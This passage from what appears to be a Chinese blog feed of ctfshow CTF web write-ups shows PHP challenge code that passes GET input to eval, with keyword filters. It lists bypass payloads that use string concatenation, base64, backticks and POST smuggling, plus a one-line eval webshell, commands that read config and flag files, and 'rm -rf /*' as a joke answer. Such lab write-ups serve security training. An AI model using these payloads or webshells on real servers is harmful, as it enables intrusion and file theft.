number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$key</span><span class=\"token operator\">=</span>  <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"HappyNewYear\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"虎年大吉，新春快乐！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>弱类型比较</p>\n<p>只需解决 <code>call_user_func </code> 函数即可</p>\n<p>为了让后面等于，那么可以使用函数 <code>session_start</code> , 返回 bool 值</p>\n<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> Web 4</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>$key=  call_user_func(($_GET[1]));</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>file_put_contents($key, \"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>\\<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>\");</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>die(\"虎年大吉，新春快乐！\");</pre></td></tr></tbody></table></figure><p>1=spl_autoload_extensions</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/d2cf6418694b28cf61e50bdb9a21519dc7a123eb.png\" alt=\"\"></p>\n<p>注册好后，先访问 <code>.inc,.php</code> , 同时 post 命令， <code>1=system('ls');</code> , 只回显 <code>index.php</code>  那么访问根目录下的文件 <code>1=system('ls /');</code>  看到 <code>f1ag.txt</code>  再输入 <code>1=system('cat /f1ag.txt')</code> ，得到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/ca4ad134f882baa5980c36c06efd2c11c51ac995.png\" alt=\"\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7c4924dd/",
            "url": "http://dpm12345.cn/posts/7c4924dd/",
            "title": "萌新",
            "date_published": "2022-10-04T02:28:52.000Z",
            "content_html": "<p>常见的一些命令执行的语句</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>system()</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>passthru()</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>exec()</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shell_exec()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>popen()</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>proc_open()</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pcntl_exec()</pre></td></tr></tbody></table></figure><p>各种绕过姿势，总结一下</p>\n<ol>\n<li>\n<p>构造 <code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code></p>\n</li>\n<li>\n<p>cat 绕过 <code>?c=system('ca\"\"t config.php')</code></p>\n</li>\n<li>\n<p>base64 绕过 <code>?c=$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);</code></p>\n</li>\n<li>\n<p>闭合 <code>?c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?&gt;</code></p>\n</li>\n<li>\n<p>POST 传值</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?c=echo `$_POST [1]`?&gt;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?c=echo `$_POST [1]`;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>然后通过 post 方式传入 1=cat config.php</pre></td></tr></tbody></table></figure></li>\n</ol>\n<h1 id=\"萌新-隐写-4\"><a class=\"anchor\" href=\"#萌新-隐写-4\">#</a> 萌新 隐写 4</h1>\n<p>word 文件中的选项有隐藏文字这一选项，勾上能查看隐藏的文字</p>\n<h1 id=\"web-3\"><a class=\"anchor\" href=\"#web-3\">#</a> web 3</h1>\n<p>使用逻辑符绕过</p>\n<p><code>?id=10 || id=1000</code></p>\n<h1 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h1>\n<p>使用字符串: <code>?id=\"1000\"</code></p>\n<h1 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h1>\n<p>使用异或: <code>?id=328^672</code></p>\n<p>使用运算符绕过 <code>?id=~~1000</code></p>\n<h1 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h1>\n<p>使用运算符绕过 <code>?id=~~1000</code></p>\n<h1 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h1>\n<p>使用二进制绕过 1000 的二进制</p>\n<p>各进制的前缀</p>\n<ul>\n<li><strong>二进制：0b</strong></li>\n<li><strong>八进制：0O</strong></li>\n<li><strong>十进制：无前缀</strong></li>\n<li><strong>十六进制：0x</strong></li>\n</ul>\n<p>故构造 payload  <code>?id=0b1111101000</code></p>\n<h1 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h1>\n<p>梗题</p>\n<p>弹窗中有 \"熟悉的一顿操作后，去了埃塞俄比亚\"</p>\n<p>去了那么远，那么极有可能是删库跑路 而删库跑路的命令为  <code>rm -rf /*</code></p>\n<h1 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h1>\n<p>题目源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>即包含  <code>system</code>  或  <code>exec</code>  或  <code>highlight</code>  才会执行  <code>eval</code>  函数</p>\n<p>而  <code>eval</code>  会将  <code>c</code>  作为 PHP 代码执行 这里只需显示  <code>config.php</code>  文件内容即可</p>\n<p>这里用到了  <code>highlight_file()</code>  函数  <code>highlight_file(string $filename, bool $return false);</code></p>\n<p>即代码高亮 filename 文件，若第二个参数是  <code>false</code> ，则打印输出文件，若  <code>true</code> ，则将其转换为字符串返回</p>\n<h1 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h1>\n<p>绕过，采用字符串拼接</p>\n<p><code>?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');</code>  或</p>\n<p><code>?c=$a='high';$b='light_file';$d=$a.$b;$d('config.php');</code></p>\n<h1 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>?c=passthru(‘tac config.php’);</code></p>\n<h1 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\.|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>?c=passthru(‘tac confi*’);</code></p>\n<p><code>?c=$a=base64_decode(‘Y29uZmlnLnBocA==’);passthru(“more $a”);</code></p>\n<h1 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\.|\\;|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>分号被过滤了，考虑到结束符隐藏有分号，那么用结束符  <code>&gt;?</code>  代替分号</p>\n<h1 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>源码中通过 GET 请求获取参数，并过滤了参数中的  <code>system exec highlight cat ( . ; file php config</code>  等关键字，</p>\n<p>这里有几个比较重要的点</p>\n<ol>\n<li>过滤了括号  <code>( </code> , 函数不能用了，但仍然可以用反引号 ` 来执行系统命令</li>\n<li>过滤了分号 <code>；</code> , 可以使用 <code>?&gt;</code>  来代替分号，但这样一来就只能执行一行代码，增加了解题的难度</li>\n<li>源码中的过滤只针对 GET 请求的参数，并未对 POST 请求的参数做限制，可以利用这一点搞事情</li>\n</ol>\n<p>首先我们通过 GET 请求的参数传递一句话木马， <code>$_POST[a]</code>  接收 POST 请求传递的参数，而后反引号将接收的参数当做系统命令执行，由于反引号执行完成后并不输出结果，而是返回一个保存执行结果的字符串类型变量，所以需要使用  <code>echo</code>  来输出这个变量，从而输出执行结果</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?c=echo `$_POST[a]`?&gt;</pre></td></tr></tbody></table></figure><p>而后使用代理工具 (Burp Suite) 抓包，在 POST 请求中传递需要执行的系统命令，这里需要注意两个地方 ( 如果使用的是其他工具可以忽略)</p>\n<ol>\n<li>拦截的请求是 GET 请求，需要改成 POST 请求才能在请求体中传递参数</li>\n<li>由于手动将 GET 请求改成了 POST 请求，需要再手动添加  <code>Content-Type: application/x-www-form-urlencoded</code>  , 否则将无法正常发送 POST 请求的参数  <code>a=cat config.php</code></li>\n</ol>\n<p>或者直接用 Hackbar</p>\n<h1 id=\"web-15\"><a class=\"anchor\" href=\"#web-15\">#</a> web 15</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?c=echo $_GET[1];&amp;1=tac config.php</pre></td></tr></tbody></table></figure><h1 id=\"web-16\"><a class=\"anchor\" href=\"#web-16\">#</a> web 16</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># flag in config.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token 